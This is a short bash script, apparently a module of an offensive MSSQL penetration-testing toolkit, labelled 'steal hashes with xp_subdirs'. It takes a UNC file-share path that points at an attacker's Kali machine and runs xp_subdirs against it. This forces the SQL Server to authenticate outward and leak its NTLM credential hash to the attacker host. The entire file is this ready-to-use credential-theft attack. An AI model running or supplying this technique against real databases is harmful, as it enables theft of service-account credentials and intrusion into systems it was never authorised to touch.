#!/bin/bash

: '
steal hashes with xp_subdirs
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_SHARE_FIELD=$(form_item  "file share" "file_share" "\\\\${KALI_IP}\share\\")

# Generate GUI form
generate_form "${FILE_SHARE_FIELD}"

FILE_SHARE=${form_data["file_share"]}

execute_command "xp_subdirs '${FILE_SHARE}'"
create_new_line
